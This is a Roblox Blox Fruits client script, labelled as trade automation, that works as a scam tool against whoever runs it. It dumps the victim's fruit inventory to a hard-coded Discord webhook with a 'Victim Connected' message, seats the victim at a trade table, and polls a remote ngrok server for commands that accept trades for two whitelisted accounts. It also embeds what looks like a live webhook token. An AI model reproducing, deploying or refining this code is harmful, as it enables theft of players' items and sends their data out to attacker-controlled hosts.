-- made by Noob -- Finalized Blox Fruits Trade Automation & Precise Auto-Sitting Client Script
-- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus
-- *fully integrated inventory webhook, precise TradeTable P1/P2 seating, multi-user whitelist, occupant checks, and command polling*

getgenv().bfRunning = nil
getgenv().bfRunning = true

print("[DEBUG] Initializing Finalized Blox Fruits Trade Automation & Auto-Sitting...")

local Config = {
    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local requestFunc = syn and syn.request or http_request or request

local function IsAuthorized(username)
    for _, name in ipairs(Config.AuthorizedUsers) do
        if name == username then
            return true
        end
    end
    return false
end

local function GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

local function TransmitTelemetry()
    local inventory = GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected, Seated & Inventory Dumped!",
        embeds = {{
            title = "Target Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = Config.WebhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

-- Precise check targeting only P1 and P2 seats inside TradeTable instances (covers both Sea 2 Cafe and Sea 3 Mansion)
local function IsTradeTableSeat(seat)
    local parent = seat.Parent
    if parent and parent.Name == "TradeTable" then
        if seat.Name == "P1" or seat.Name == "P2" then
            return true
        end
    end
    return false
end

local function ManageSeating()
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
    local hrp = character.HumanoidRootPart
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Check if currently sitting
    if humanoid.SeatPart then
        local seat = humanoid.SeatPart
        local occupant = seat.Occupant
        if occupant and occupant ~= humanoid then
            local sittingPlayer = Players:GetPlayerFromCharacter(occupant.Parent)
            if sittingPlayer and not IsAuthorized(sittingPlayer.Name) then
                print("[DEBUG] Unauthorized player detected in trade chair. Jumping & switching...")
                humanoid.Jump = true
                task.wait(0.5)
            end
        end
        return
    end

    -- Search workspace specifically for TradeTable P1 / P2 chairs
    pcall(function()
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Seat") and IsTradeTableSeat(obj) then
                if not obj.Occupant then
                    if (hrp.Position - obj.Position).Magnitude < 400 then
                        hrp.CFrame = obj.CFrame + Vector3.new(0, 3, 0)
                        task.wait(0.3)
                        obj:Sit(humanoid)
                        break
                    end
                end
            end
        end
    end)
end

local function InvokeTradeAction(action)
    if not TradeFunction then
        warn("[ERROR] TradeFunction remote missing!")
        return
    end

    print("[DEBUG] Processing action via verified remote layout:", action)

    pcall(function()
        if action == "accept" then
            local args = { "accept" }
            TradeFunction:InvokeServer(unpack(args))
        elseif action == "cancel" then
            local args = { "cancel" }
            TradeFunction:InvokeServer(unpack(args))
        end
    end)
end

task.spawn(function()
    pcall(TransmitTelemetry)

    if not requestFunc then
        warn("[ERROR] Executor does not support http requests!")
        return
    end

    while true do
        task.wait(1)
        pcall(ManageSeating)

        pcall(function()
            local response = requestFunc({
                Url = Config.CommandApiUrl,
                Method = "GET"
            })

            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.command then
                    print("[DEBUG] Command fetched from Discord bridge:", data.command)
                    InvokeTradeAction(data.command)
                end
            end
        end)
    end
end)
